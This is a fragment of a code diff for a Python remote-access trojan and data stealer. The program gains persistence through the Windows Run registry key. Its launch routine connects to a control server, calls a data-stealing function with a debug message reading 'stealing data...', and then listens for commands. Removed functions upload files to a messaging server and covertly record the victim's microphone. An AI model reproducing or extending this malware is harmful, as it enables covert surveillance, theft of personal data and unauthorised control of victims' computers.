+        debug_message("[Autorun] Not unregistering, as running not from final executable file (not a .exe)")
 
         # Returning.
         return
 
+    if not sys.platform.startswith("win32"):
+        # If not windows family.
+        
+        # Debug message.
+        debug_message("[Autorun] Not unregistering, as running not from Windows-Family OS.")
+
+        # Returning.
+        return
+    
     try:
         # Trying to import winreg module.
 
@@ -2443,7 +2594,7 @@ def autorun_unregister() -> None:
         # If there is ImportError.
 
         # Debug message.
-        debug_message("Cannot remove self to the autorun! Could not import module winreg")
+        debug_message("[Autorun] Failed to unregister self from the autorun! Could not import module winreg")
 
         # Returning.
         return
@@ -2452,165 +2603,74 @@ def autorun_unregister() -> None:
         # Trying to remove autorun.
 
         # Opening key.
-        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
+        registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                        sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                        reserved=0, access=winreg.KEY_ALL_ACCESS)
 
         # Deleting autorun.
-        winreg.DeleteValue(_registry_key, "Update")
+        winreg.DeleteValue(registry_key, config["autorun"]["name"])
 
         # Closing key.
-        winreg.CloseKey(_registry_key)
-    except Exception as _exception:  # noqa
+        winreg.CloseKey(registry_key)
+    except Exception as exception:  # noqa
         # If error occurred.
 
         # Debug message.
-        debug_message(f"Couldn`t add self in the autorun! Error: {_exception}")
+        debug_message(f"[Autorun] Failed to unregister self from the autorun! Exception: {exception}")
 
 
-def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
-    # @function server_upload_document()
-    # @returns str or list
-    # @description Function that uploads document on the server and returns it.
-
-    try:
-        # Trying to upload document.
-
-        # Getting api for the uploader.
-        _server_api = __SERVER_API.get_api()  # noqa
-
-        # Getting upload server.
-        _upload_server = _server_api.docs.getMessagesUploadServer(type=_type, peer_id=_peer)['upload_url']
-
-        # Posting file on the server.
-        _request = json.loads(requests.post(_upload_server, files={'file': open(_path, 'rb')}).text)
-
-        if "file" in _request:
-            # If there is all fields in response.
-
-            # Saving file to the docs.
-            _request = _server_api.docs.save(file=_request['file'], title=_title, tags=[])
-
-            # Returning document.
-            return f"doc{_request[_type]['owner_id']}_{_request[_type]['id']}"
-        else:
-            # If there is not all fields.
-
-            # Debug message.
-            debug_message(f"Error when uploading document (Request)!")
-
-            # Returning request as error.
-            return [_request]  # noqa
-    except Exception as _exception:  # noqa
-        # If there is error.
-
-        # Debug message.
-        debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")
-
-        # Returning exception.
-        return [_exception]  # noqa
-
-
-def record_microphone(_path, seconds: int = 1) -> None:
-    # @function record_microphone()
-    # @returns None
-    # @description Function that records microphone.
-
-    # Importing.
-    try:
-        # Trying to import modules.
-
-        # Importing.
-        import pyaudio
-        import wave
-    except ImportError:
-        # If there is import error.
-
-        # Not supported.
-        debug_message(
-            "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)")  # noqa
-
-        # Returning.
-        return
-
-    # Creating audio port.
-    audio = pyaudio.PyAudio()
-
-    # Opening audio stream.
-    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)
-
-    # Frames list.
-    frames = []
-
-    # Writing data stream.
-    for _ in range(0, int(44100 / 1024 * int(seconds))):
-        data = stream.read(1024)
-        frames.append(data)
-
-    # Stopping.
-    stream.stop_stream()
-    stream.close()
-    audio.terminate()
-
-    # Validating filename.
-    filesystem_build_path(_path)
-
-    # Save recording as wav file.
-    file = wave.open(_path, 'wb')
-    file.setnchannels(1)
-    file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
-    file.setframerate(44100)
-    file.writeframes(b''.join(frames))
-    file.close()
-
+# Config.
 
 def load_config():
     """ Loads config values. """
-
-    def _walk_config(_dict):
-        for key in _dict.keys():
-            if _value := _dict[key]:
-                if type(_value) == list:
-                    continue
-                if type(_value) == dict:
-                    _walk_config(_value)
 
     # Globalise config.
     global config
 
     # Opening JSON file
-    with open("config.json", "r") as _configfile:
-        config = json.load(_configfile)
+    try:
+        with open("config.json", "r") as config_file:
+            config = json.load(config_file)
+    except FileNotFoundError:
+        # If config not exists.
+        debug_message("[Config] Failed to load config file as it is not found! Please read more wiki...")
 
     if not config:
         # If empty.
 
-        # Debug message.
-        debug_message("Config load error! (!config)")
+        # Error.
+        debug_message("[Config] Failed to load! Is config file empty?")
+        exit(1)
 
-        # Close.
-        raise SystemExit
+    # Message.
+    debug_message("[Config] Loading complete!")
+
+
+# Other.
+
+def exit_handler() -> None:
+    """ Should be registered as exit handler (at_exit). """
+
+    # Sever message.
+    server_message(f"Disconnected from the network!")
 
     # Debug message.
-    debug_message("Config load complete!")
+    debug_message("[Exit Handler] Exit...")
 
 
 def launch() -> None:
-    # @function launch()
-    # @returns None
-    # @description Function that launches all the system of the app.
+    """ Launchs all. """
+
     try:
         # Trying to initialise app.
 
         # Start message.
-        debug_message("Called launch!")
+        debug_message("[Launch] Starting...")
 
         # Load config to work with values.
         load_config()
 
         # Asserting operating system, exiting if the operation system is not supported.
-        # Supported:
-        # Windows (Fully supported), Linux (Partially supported)
         assert_operating_system()
 
         # Setting folder path for later file manipulations.
@@ -2626,7 +2686,7 @@ def launch() -> None:
         load_name()
 
         # Start message.
-        debug_message("Tags and name loading completed!")
+        debug_message("[Launch] Tags and name loading completed!")
 
         # Connecting to the server.
         server_connect()
@@ -2646,17 +2706,23 @@ def launch() -> None:
         # Registering exit_handler() as handler for exit.
         atexit.register(exit_handler)
 
+        # Start message.
+        debug_message("[Launch] Almost done, stealing data...")
+
         # Stealing all of the data.
         stealer_steal_data()
 
+        # Start message.
+        debug_message("[Launch] Launch end! Starting listening server...")
+
         # Starting listening messages.
         server_listen()
-    except Exception as _exception:  # noqa
+    except Exception as exception:  # noqa
         # If there is exception occurred.
 
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function launch()! "
-                      f"Full exception information - {_exception}")
+        # Error.
+        debug_message(f"[Launch] Failed to launch! Exception - {exception}")
+        exit(1)
 
 
 # Entry point of the app, calling launch function to start all systems.
